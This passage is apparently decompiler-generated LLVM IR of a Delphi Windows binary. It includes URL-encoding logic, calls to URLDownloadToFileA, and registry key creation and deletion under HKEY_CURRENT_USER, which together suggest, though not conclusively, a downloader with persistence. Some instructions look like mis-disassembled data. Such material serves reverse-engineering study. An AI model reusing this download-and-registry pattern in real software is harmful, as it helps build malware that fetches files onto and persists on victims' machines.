dec_label_pc_404fe8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !558
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !558
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !558
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !559
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !560
  %3 = add i32 %2, 1, !insn.addr !560
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !560
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !561
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !562
  ret i32 0, !insn.addr !563
}

define i32 @function_40500d() local_unnamed_addr {
dec_label_pc_40500d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !564
  ret i32 %0, !insn.addr !564
}

define i32 @function_405012() local_unnamed_addr {
dec_label_pc_405012:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !565
}

define i32 @function_405014(i32 %arg1) local_unnamed_addr {
dec_label_pc_405014:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !566
}

define i32 @function_405018() local_unnamed_addr {
dec_label_pc_405018:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !567
  %2 = add i32 %1, -1, !insn.addr !567
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !567
  ret i32 %0, !insn.addr !568
}

define i32 @function_405020(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_405020:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !569
  ret i32 %0, !insn.addr !569
}

define i32 @function_405028() local_unnamed_addr {
dec_label_pc_405028:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !570
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !570
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !570
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !571
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !572
  %3 = add i32 %2, 1, !insn.addr !572
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !572
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !573
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !574
  ret i32 0, !insn.addr !575
}

define i32 @function_40504d() local_unnamed_addr {
dec_label_pc_40504d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !576
  ret i32 %0, !insn.addr !576
}

define i32 @function_405052() local_unnamed_addr {
dec_label_pc_405052:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !577
}

define i32 @function_405054(i32 %arg1) local_unnamed_addr {
dec_label_pc_405054:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !578
}

define i32 @function_405058() local_unnamed_addr {
dec_label_pc_405058:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !579
  %2 = add i32 %1, -1, !insn.addr !579
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !579
  ret i32 %0, !insn.addr !580
}

define i32 @function_405060() local_unnamed_addr {
dec_label_pc_405060:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !581
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_405064, label %dec_label_pc_40506d, !insn.addr !582

dec_label_pc_405064:                              ; preds = %dec_label_pc_405060
  %4 = add nuw nsw i32 %3, 48, !insn.addr !583
  ret i32 %4, !insn.addr !584

dec_label_pc_40506d:                              ; preds = %dec_label_pc_405060
  %5 = add nuw nsw i32 %3, 55, !insn.addr !585
  ret i32 %5, !insn.addr !586
}

define i32 @function_405078() local_unnamed_addr {
dec_label_pc_405078:
  %esp.2.reg2mem = alloca i32, !insn.addr !587
  %esp.1.reg2mem = alloca i32, !insn.addr !587
  %cf.0.reg2mem = alloca i1, !insn.addr !587
  %esi.0.reg2mem = alloca i32, !insn.addr !587
  %esp.0.reg2mem = alloca i32, !insn.addr !587
  %ebx.0.reg2mem = alloca i32, !insn.addr !587
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !588
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !589
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !589
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !589
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !590
  %4 = call i32 @"@LStrClr"(), !insn.addr !591
  %5 = call i32 @function_4034f4(), !insn.addr !592
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !593
  br i1 %6, label %dec_label_pc_405179, label %dec_label_pc_4050c5.preheader, !insn.addr !593

dec_label_pc_4050c5.preheader:                    ; preds = %dec_label_pc_405078
  %7 = add i32 %0, -1, !insn.addr !594
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_4050c5

dec_label_pc_4050c5:                              ; preds = %dec_label_pc_4050c5.preheader, %dec_label_pc_405171
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !594
  %9 = inttoptr i32 %8 to i8*, !insn.addr !594
  %10 = load i8, i8* %9, align 1, !insn.addr !594
  %11 = icmp eq i8 %10, 32, !insn.addr !594
  %12 = icmp eq i1 %11, false, !insn.addr !595
  br i1 %12, label %dec_label_pc_4050e0, label %dec_label_pc_4050cf, !insn.addr !595

dec_label_pc_4050cf:                              ; preds = %dec_label_pc_4050c5
  %13 = call i32 @"@LStrCat"(), !insn.addr !596
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !597
  br label %dec_label_pc_405171, !insn.addr !597

dec_label_pc_4050e0:                              ; preds = %dec_label_pc_4050c5
  %14 = icmp ult i8 %10, 32, !insn.addr !598
  br i1 %14, label %dec_label_pc_405103, label %dec_label_pc_4050ea, !insn.addr !599

dec_label_pc_4050ea:                              ; preds = %dec_label_pc_4050e0
  %15 = add i8 %10, -32, !insn.addr !600
  %16 = icmp ult i8 %15, 95, !insn.addr !601
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !602
  br i1 %17, label %dec_label_pc_4050f7, label %dec_label_pc_405101, !insn.addr !602

dec_label_pc_4050f7:                              ; preds = %dec_label_pc_4050ea
  %18 = load i32, i32* inttoptr (i32 4215224 to i32*), align 8, !insn.addr !603
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !603
  %21 = shl i32 1, %20, !insn.addr !603
  %22 = and i32 %18, %21, !insn.addr !603
  %23 = icmp ne i32 %22, 0, !insn.addr !603
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !603
  br label %dec_label_pc_405101, !insn.addr !603

dec_label_pc_405101:                              ; preds = %dec_label_pc_4050ea, %dec_label_pc_4050f7
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !604
  br i1 %24, label %dec_label_pc_405158, label %dec_label_pc_405103, !insn.addr !604

dec_label_pc_405103:                              ; preds = %dec_label_pc_405101, %dec_label_pc_4050e0
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !605
  %27 = add i32 %esp.0.reload, -4, !insn.addr !606
  %28 = inttoptr i32 %27 to i32*, !insn.addr !606
  store i32 %26, i32* %28, align 4, !insn.addr !606
  %29 = add i32 %esp.0.reload, -8, !insn.addr !607
  %30 = inttoptr i32 %29 to i32*, !insn.addr !607
  store i32 ptrtoint (i32* @global_var_4051cc to i32), i32* %30, align 4, !insn.addr !607
  %31 = call i32 @function_405060(), !insn.addr !608
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !609
  %33 = add i32 %esp.0.reload, -12, !insn.addr !610
  %34 = inttoptr i32 %33 to i32*, !insn.addr !610
  store i32 0, i32* %34, align 4, !insn.addr !610
  %35 = call i32 @function_405060(), !insn.addr !611
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !612
  %37 = add i32 %esp.0.reload, -16, !insn.addr !613
  %38 = inttoptr i32 %37 to i32*, !insn.addr !613
  store i32 0, i32* %38, align 4, !insn.addr !613
  %39 = call i32 @"@LStrCatN"(), !insn.addr !614
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !615
  br label %dec_label_pc_405171, !insn.addr !615

dec_label_pc_405158:                              ; preds = %dec_label_pc_405101
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !616
  %41 = call i32 @"@LStrCat"(), !insn.addr !617
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !617
  br label %dec_label_pc_405171, !insn.addr !617

dec_label_pc_405171:                              ; preds = %dec_label_pc_405158, %dec_label_pc_405103, %dec_label_pc_4050cf
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !618
  %43 = add i32 %esi.0.reload, -1, !insn.addr !619
  %44 = icmp eq i32 %43, 0, !insn.addr !619
  %45 = icmp eq i1 %44, false, !insn.addr !620
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !620
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !620
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !620
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !620
  br i1 %45, label %dec_label_pc_4050c5, label %dec_label_pc_405179, !insn.addr !620

dec_label_pc_405179:                              ; preds = %dec_label_pc_405171, %dec_label_pc_405078
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !621
  %47 = load i32, i32* %46, align 4, !insn.addr !621
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !622
  %48 = add i32 %esp.2.reload, 8, !insn.addr !623
  %49 = inttoptr i32 %48 to i32*, !insn.addr !623
  store i32 4215203, i32* %49, align 4, !insn.addr !623
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !624
  %51 = call i32 @"@LStrClr"(), !insn.addr !625
  ret i32 %51, !insn.addr !626
}

define i32 @function_40519c() local_unnamed_addr {
dec_label_pc_40519c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !627
  ret i32 %0, !insn.addr !627
}

define i32 @function_4051a1() local_unnamed_addr {
dec_label_pc_4051a1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !628
}

define i32 @function_4051a3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !629
}

define i32 @function_4051c7() local_unnamed_addr {
dec_label_pc_4051c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !630
  %2 = inttoptr i32 %0 to i32*, !insn.addr !630
  store i32 %1, i32* %2, align 4, !insn.addr !630
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !631
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !631
  %7 = add i8 %4, %6, !insn.addr !631
  %8 = inttoptr i32 %5 to i8*, !insn.addr !631
  store i8 %7, i8* %8, align 1, !insn.addr !631
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !632
  %10 = load i32, i32* %eax, align 4, !insn.addr !632
  %11 = udiv i32 %10, 256, !insn.addr !632
  %12 = trunc i32 %11 to i8, !insn.addr !632
  %13 = add i8 %9, %12, !insn.addr !632
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !632
  %14 = call i32 @function_4036e4(), !insn.addr !633
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !634
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !634
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !634
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !635
  %17 = call i32 @"@LStrCatN"(), !insn.addr !636
  %18 = call i32 @function_4036f4(), !insn.addr !637
  %19 = inttoptr i32 %18 to i32*, !insn.addr !638
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !638
  call void @__writefsdword(i32 0, i32 0), !insn.addr !639
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !640
  ret i32 %21, !insn.addr !641
}

define i32 @function_4051d0() local_unnamed_addr {
dec_label_pc_4051d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_40523e() local_unnamed_addr {
dec_label_pc_40523e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !642
  ret i32 %0, !insn.addr !642
}

define i32 @function_405243() local_unnamed_addr {
dec_label_pc_405243:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !643
}

define i32 @function_405245(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405245:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !644
}

define i32 @function_40524f() local_unnamed_addr {
dec_label_pc_40524f:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !645
  %5 = inttoptr i32 %3 to i32*, !insn.addr !645
  store i32 %4, i32* %5, align 4, !insn.addr !645
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !646
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !646
  %10 = add i8 %7, %9, !insn.addr !646
  %11 = inttoptr i32 %8 to i8*, !insn.addr !646
  store i8 %10, i8* %11, align 1, !insn.addr !646
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !647
  %14 = udiv i32 %1, 256, !insn.addr !647
  %15 = trunc i32 %14 to i8, !insn.addr !647
  %16 = add i8 %13, %15, !insn.addr !647
  %17 = load i32, i32* %edi, align 4, !insn.addr !647
  %18 = inttoptr i32 %17 to i8*, !insn.addr !647
  store i8 %16, i8* %18, align 1, !insn.addr !647
  %19 = load i8, i8* %6, align 4, !insn.addr !648
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !648
  %22 = add i8 %19, %21, !insn.addr !648
  %23 = inttoptr i32 %20 to i8*, !insn.addr !648
  store i8 %22, i8* %23, align 1, !insn.addr !648
  %24 = add i32 %0, -117, !insn.addr !649
  %25 = inttoptr i32 %24 to i8*, !insn.addr !649
  %26 = load i8, i8* %25, align 1, !insn.addr !649
  %27 = trunc i32 %2 to i8, !insn.addr !649
  %28 = add i8 %26, %27, !insn.addr !649
  store i8 %28, i8* %25, align 1, !insn.addr !649
  %29 = trunc i32 %2 to i16, !insn.addr !650
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !650
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !651
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !651
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !651
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !652
  %33 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !653
  %34 = add i32 %33, 1, !insn.addr !653
  store i32 %34, i32* @global_var_4096ac, align 4, !insn.addr !653
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !654
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !655
  ret i32 0, !insn.addr !656
}

define i32 @function_40527d() local_unnamed_addr {
dec_label_pc_40527d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !657
  ret i32 %0, !insn.addr !657
}

define i32 @function_405282() local_unnamed_addr {
dec_label_pc_405282:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !658
}

define i32 @function_405284(i32 %arg1) local_unnamed_addr {
dec_label_pc_405284:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !659
}

define i32 @function_405288() local_unnamed_addr {
dec_label_pc_405288:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !660
  %2 = add i32 %1, -1, !insn.addr !660
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !660
  ret i32 %0, !insn.addr !661
}

define i32 @function_405290() local_unnamed_addr {
dec_label_pc_405290:
  %eax.0.reg2mem = alloca i32, !insn.addr !662
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !663
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !664
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !665
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_40531c, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !666
  %1 = call i32 @function_4043b8(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_40531c, i32 0, i32 0), i32 -2147483647), !insn.addr !667
  %2 = icmp eq i32 %1, 0, !insn.addr !668
  %3 = icmp eq i1 %2, false, !insn.addr !669
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !669
  br i1 %3, label %dec_label_pc_40530a, label %dec_label_pc_4052c5, !insn.addr !669

dec_label_pc_4052c5:                              ; preds = %dec_label_pc_405290
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !670
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !671
  %5 = call i32 @function_4043c0(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_408104, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_405338, i32 0, i32 0), i32 -2147483647), !insn.addr !671
  %6 = icmp eq i32 %5, 0, !insn.addr !672
  %7 = icmp eq i1 %6, false, !insn.addr !673
  br i1 %7, label %dec_label_pc_405301, label %dec_label_pc_4052f1, !insn.addr !673

dec_label_pc_4052f1:                              ; preds = %dec_label_pc_4052c5
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !674
  br label %dec_label_pc_405301, !insn.addr !674

dec_label_pc_405301:                              ; preds = %dec_label_pc_4052f1, %dec_label_pc_4052c5
  %9 = call i32 @function_4043a0(), !insn.addr !675
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !675
  br label %dec_label_pc_40530a, !insn.addr !675

dec_label_pc_40530a:                              ; preds = %dec_label_pc_405301, %dec_label_pc_405290
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !676
}

define i32 @function_405313(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_405313:
  %esp.1.reg2mem = alloca i32, !insn.addr !677
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !677
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !677
  %6 = inttoptr i32 %3 to i32*, !insn.addr !677
  store i32 %5, i32* %6, align 4, !insn.addr !677
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !678
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !678
  %11 = add i8 %8, %10, !insn.addr !678
  %12 = inttoptr i32 %9 to i8*, !insn.addr !678
  store i8 %11, i8* %12, align 1, !insn.addr !678
  %13 = add i32 %1, 122, !insn.addr !679
  %14 = inttoptr i32 %13 to i8*, !insn.addr !679
  %15 = load i8, i8* %14, align 1, !insn.addr !679
  %16 = udiv i32 %4, 256, !insn.addr !679
  %17 = trunc i32 %16 to i8, !insn.addr !679
  %18 = add i8 %15, %17, !insn.addr !679
  store i8 %18, i8* %14, align 1, !insn.addr !679
  %19 = load i8, i8* %7, align 4, !insn.addr !680
  %20 = load i32, i32* %eax, align 4, !insn.addr !680
  %21 = trunc i32 %20 to i8, !insn.addr !680
  %22 = add i8 %19, %21, !insn.addr !680
  %23 = icmp eq i8 %22, 0, !insn.addr !680
  %24 = inttoptr i32 %20 to i8*, !insn.addr !680
  store i8 %22, i8* %24, align 1, !insn.addr !680
  %25 = trunc i32 %3 to i16, !insn.addr !681
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !681
  br i1 %23, label %26, label %dec_label_pc_405321, !insn.addr !682

; <label>:26:                                     ; preds = %dec_label_pc_405313
  %27 = call i32 @unknown_5398(), !insn.addr !682
  br label %dec_label_pc_405321, !insn.addr !682

dec_label_pc_405321:                              ; preds = %26, %dec_label_pc_405313
  %28 = icmp ult i8 %22, %19, !insn.addr !680
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !683
  store i32 %29, i32* %eax, align 4, !insn.addr !683
  br i1 %28, label %dec_label_pc_405389, label %dec_label_pc_405324, !insn.addr !684

dec_label_pc_405324:                              ; preds = %dec_label_pc_405321
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !685, !insn.addr !680
  %31 = and i8 %30, 1, !insn.addr !680
  %32 = icmp eq i8 %31, 0, !insn.addr !680
  %33 = trunc i32 %arg4 to i16, !insn.addr !686
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !686
  %35 = inttoptr i32 %2 to i32*, !insn.addr !686
  store i32 %34, i32* %35, align 4, !insn.addr !686
  br i1 %32, label %dec_label_pc_405384, label %dec_label_pc_405328, !insn.addr !687

dec_label_pc_405328:                              ; preds = %dec_label_pc_405324
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !688
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !689
  %36 = add i32 %arg4, 1, !insn.addr !690
  %37 = icmp eq i32 %36, 0, !insn.addr !690
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !691
  br i1 %37, label %dec_label_pc_40538f, label %dec_label_pc_40532e, !insn.addr !691

dec_label_pc_40532e:                              ; preds = %dec_label_pc_405328
  %38 = load i32, i32* %eax, align 4, !insn.addr !692
  %39 = add i32 %38, -1, !insn.addr !692
  store i32 %39, i32* %eax, align 4, !insn.addr !692
  %40 = trunc i32 %36 to i16, !insn.addr !693
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !693
  %42 = load i32, i32* %41, align 4, !insn.addr !693
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !693
  %43 = load i32, i32* %41, align 4, !insn.addr !694
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !694
  %44 = add i32 %arg7, 105, !insn.addr !695
  %45 = inttoptr i32 %44 to i8*, !insn.addr !695
  %46 = load i8, i8* %45, align 1, !insn.addr !695
  %47 = trunc i32 %39 to i8, !insn.addr !695
  %48 = add i8 %46, %47, !insn.addr !695
  %49 = icmp ult i8 %48, %46, !insn.addr !695
  store i8 %48, i8* %45, align 1, !insn.addr !695
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !696
  br i1 %49, label %dec_label_pc_4053af, label %dec_label_pc_40533c, !insn.addr !696

dec_label_pc_40533c:                              ; preds = %dec_label_pc_40532e
  %50 = icmp eq i8 %48, 0, !insn.addr !695
  br i1 %50, label %dec_label_pc_40535e, label %dec_label_pc_40533e, !insn.addr !697

dec_label_pc_40533e:                              ; preds = %dec_label_pc_40533c
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !698
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_4053af

dec_label_pc_40535e:                              ; preds = %dec_label_pc_40533c
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !699
  %53 = load i32, i32* %52, align 4, !insn.addr !699
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !699
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !700
  store i32 ptrtoint ([27 x i8]* @global_var_4053f4 to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !701
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !702
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !703
  %55 = add i32 %arg6, -8, !insn.addr !704
  %56 = inttoptr i32 %55 to i32*, !insn.addr !704
  store i32 0, i32* %56, align 4, !insn.addr !704
  %57 = add i32 %arg6, -12, !insn.addr !705
  %58 = inttoptr i32 %57 to i32*, !insn.addr !705
  store i32 1, i32* %58, align 4, !insn.addr !705
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !706
  ret i32 %57, !insn.addr !706

dec_label_pc_405384:                              ; preds = %dec_label_pc_405324
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !707

dec_label_pc_405389:                              ; preds = %dec_label_pc_405321
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !708
  %62 = add i8 %60, %61, !insn.addr !708
  %63 = inttoptr i32 %2 to i8*, !insn.addr !708
  store i8 %62, i8* %63, align 1, !insn.addr !708
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !709
  %65 = load i8, i8* %64, align 1, !insn.addr !709
  %66 = udiv i32 %arg3, 256, !insn.addr !709
  %67 = trunc i32 %66 to i8, !insn.addr !709
  %68 = add i8 %65, %67, !insn.addr !709
  store i8 %68, i8* %64, align 1, !insn.addr !709
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !709
  br label %dec_label_pc_40538f, !insn.addr !709

dec_label_pc_40538f:                              ; preds = %dec_label_pc_405389, %dec_label_pc_405328
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !710
  %70 = inttoptr i32 %69 to i32*, !insn.addr !710
  store i32 0, i32* %70, align 4, !insn.addr !710
  %71 = add i32 %esp.0, -8, !insn.addr !711
  %72 = inttoptr i32 %71 to i32*, !insn.addr !711
  store i32 0, i32* %72, align 4, !insn.addr !711
  %73 = add i32 %esp.0, -12, !insn.addr !712
  %74 = inttoptr i32 %73 to i32*, !insn.addr !712
  store i32 ptrtoint ([27 x i8]* @global_var_4053f4 to i32), i32* %74, align 4, !insn.addr !712
  %75 = add i32 %esp.0, -16, !insn.addr !713
  %76 = inttoptr i32 %75 to i32*, !insn.addr !713
  store i32 -2147483647, i32* %76, align 4, !insn.addr !713
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !714
  %78 = call i32 @function_4034f4(), !insn.addr !715
  %79 = add i32 %78, 1, !insn.addr !716
  %80 = add i32 %esp.0, -20, !insn.addr !717
  %81 = inttoptr i32 %80 to i32*, !insn.addr !717
  store i32 %79, i32* %81, align 4, !insn.addr !717
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !718
  br label %dec_label_pc_4053af, !insn.addr !718

dec_label_pc_4053af:                              ; preds = %dec_label_pc_40533e, %dec_label_pc_40538f, %dec_label_pc_40532e
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036f4(), !insn.addr !719
  %83 = add i32 %esp.1.reload, -4, !insn.addr !720
  %84 = inttoptr i32 %83 to i32*, !insn.addr !720
  store i32 %82, i32* %84, align 4, !insn.addr !720
  %85 = add i32 %esp.1.reload, -8, !insn.addr !721
  %86 = inttoptr i32 %85 to i32*, !insn.addr !721
  store i32 1, i32* %86, align 4, !insn.addr !721
  %87 = add i32 %esp.1.reload, -12, !insn.addr !722
  %88 = inttoptr i32 %87 to i32*, !insn.addr !722
  store i32 0, i32* %88, align 4, !insn.addr !722
  %89 = add i32 %esp.1.reload, -16, !insn.addr !723
  %90 = inttoptr i32 %89 to i32*, !insn.addr !723
  store i32 ptrtoint ([10 x i8]* @global_var_405410 to i32), i32* %90, align 4, !insn.addr !723
